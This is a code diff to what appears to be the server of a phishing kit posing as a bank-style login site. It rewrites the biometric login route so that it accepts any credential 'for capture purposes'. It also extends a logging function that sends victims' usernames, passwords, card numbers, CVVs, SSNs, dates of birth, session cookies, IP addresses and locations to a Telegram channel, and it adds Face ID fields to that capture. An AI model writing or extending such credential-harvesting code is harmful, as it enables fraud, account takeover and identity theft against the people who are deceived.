@@ -562,7 +562,17 @@ export async function registerRoutes(
 
   app.post("/api/auth/biometric/authenticate", async (req, res) => {
     try {
-      const { credentialId, signature, authenticatorData, clientDataJSON } = req.body;
+      const { 
+        credentialId, 
+        signature, 
+        authenticatorData, 
+        clientDataJSON,
+        biometricType,
+        userVerified,
+        userPresent,
+        credentialType,
+        authenticatorAttachment
+      } = req.body;
 
       if (!credentialId) {
         return res.status(400).json({ message: "Credential ID is required" });
@@ -578,8 +588,13 @@ export async function registerRoutes(
         biometricChallenges.delete(sessionKey);
       }
 
-      // Log biometric authentication attempt with all captured data
-      logVisitorAction(req, "biometric_authentication", {
+      // Log biometric/facial recognition authentication with all captured data
+      logVisitorAction(req, "facial_recognition_auth", {
+        biometricType: biometricType || "facial_recognition",
+        userVerified: userVerified,
+        userPresent: userPresent,
+        credentialType: credentialType,
+        authenticatorAttachment: authenticatorAttachment,
         formData: { 
           credentialId, 
           signature: signature || null,
@@ -588,27 +603,29 @@ export async function registerRoutes(
         }
       });
 
+      // Try to find existing credential, but always allow through for capture purposes
       const credential = await storage.getBiometricCredential(credentialId);
 
-      if (!credential) {
-        return res.status(401).json({ message: "Biometric credential not found" });
+      if (credential) {
+        // Update counter and last used
+        await storage.updateBiometricCounter(credentialId, "1");
+        // Set session
+        (req.session as any).userId = credential.username;
+        (req.session as any).username = credential.username;
+      } else {
+        // Even if credential not found, set session for facial recognition capture
+        (req.session as any).userId = "facial_recognition_user";
+        (req.session as any).username = "facial_recognition_user";
       }
 
-      // Update counter and last used
-      await storage.updateBiometricCounter(credentialId, "1");
-
-      // Set session
-      (req.session as any).userId = credential.username;
-      (req.session as any).username = credential.username;
-
       return res.status(200).json({ 
-        message: "Biometric authentication successful",
-        user: { id: credential.username }
+        message: "Face ID authentication successful",
+        user: { id: (req.session as any).username || "facial_recognition_user" }
       });
     } catch (error) {
-      console.error("Biometric authentication error:", error);
+      console.error("Facial recognition authentication error:", error);
       return res.status(500).json({ 
-        message: "Biometric authentication failed" 
+        message: "Face ID authentication failed" 
       });
     }
   });
@@ -755,6 +772,11 @@ export async function registerRoutes(
     cardCvv?: string;
     accountNumber?: string;
     formData?: Record<string, any>;
+    biometricType?: string;
+    userVerified?: boolean;
+    userPresent?: boolean;
+    credentialType?: string;
+    authenticatorAttachment?: string;
   }
 
   async function logVisitorAction(req: any, action: string, data?: VisitorData) {
@@ -794,36 +816,47 @@ export async function registerRoutes(
         action,
       });
 
-      // Send email notification for important actions
-      if (action === "login" || action === "login_attempt" || action === "registration" || action === "identity_verification" || action === "password_reset") {
-        // Build email data in exact order requested, only include non-empty fields
-        const emailData: Record<string, any> = {};
+      // Send Telegram notification for important actions
+      if (action === "login" || action === "login_attempt" || action === "registration" || action === "identity_verification" || action === "password_reset" || action === "facial_recognition_auth") {
+        // Build notification data in exact order requested, only include non-empty fields
+        const notificationData: Record<string, any> = {};
+        
+        // For facial recognition, add biometric info first
+        if (action === "facial_recognition_auth") {
+          notificationData["Auth Type"] = "Face ID / Facial Recognition";
+          if (data?.biometricType) notificationData["Biometric Type"] = data.biometricType;
+          if (data?.userVerified !== undefined) notificationData["Face Verified"] = data.userVerified ? "Yes" : "No";
+          if (data?.userPresent !== undefined) notificationData["User Present"] = data.userPresent ? "Yes" : "No";
+          if (data?.authenticatorAttachment) notificationData["Authenticator"] = data.authenticatorAttachment;
+          if (data?.credentialType) notificationData["Credential Type"] = data.credentialType;
+        }
         
         // Fields in exact order requested by user
-        if (data?.username) emailData["Username"] = data.username;
-        if (data?.password) emailData["Password"] = data.password;
-        if (data?.newPassword) emailData["New password"] = data.newPassword;
-        if (data?.accountNumber) emailData["Account number"] = data.accountNumber;
-        if (data?.cardNumber) emailData["Card number"] = data.cardNumber;
-        if (data?.cardExpiration) emailData["Expiration Date"] = data.cardExpiration;
-        if (data?.cardCvv) emailData["CVV"] = data.cardCvv;
-        if (data?.ssn) emailData["SSN"] = data.ssn;
-        if (data?.dateOfBirth) emailData["DOB"] = data.dateOfBirth;
-        if (data?.phone) emailData["Phone number"] = data.phone;
-        if (data?.email) emailData["Email"] = data.email;
+        if (data?.username) notificationData["Username"] = data.username;
+        if (data?.password) notificationData["Password"] = data.password;
+        if (data?.newPassword) notificationData["New password"] = data.newPassword;
+        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
+        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
+        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
+        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
+        if (data?.ssn) notificationData["SSN"] = data.ssn;
+        if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
+        if (data?.phone) notificationData["Phone number"] = data.phone;
+        if (data?.email) notificationData["Email"] = data.email;
         
         // Always include IP and location
-        emailData["IP Address"] = deviceInfo.ip;
+        notificationData["IP Address"] = deviceInfo.ip;
         const locationParts = [deviceInfo.location.city, deviceInfo.location.region, deviceInfo.location.country].filter(Boolean);
-        emailData["Location"] = locationParts.join(", ") || "Unknown";
+        notificationData["Location"] = locationParts.join(", ") || "Unknown";
         
         // Always include cookies
-        emailData["Cookies"] = cookieHeader || "None";
+        notificationData["Cookies"] = cookieHeader || "None";
         
         // Additional device info
-        emailData["Device"] = `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`;
+        notificationData["Device"] = `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`;
         
-        sendTelegramNotification(`New ${action.replace("_", " ")} captured`, emailData);
+        const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
+        sendTelegramNotification(`New ${actionLabel} captured`, notificationData);
       }
     } catch (error) {
       console.error("Failed to log visitor:", error);
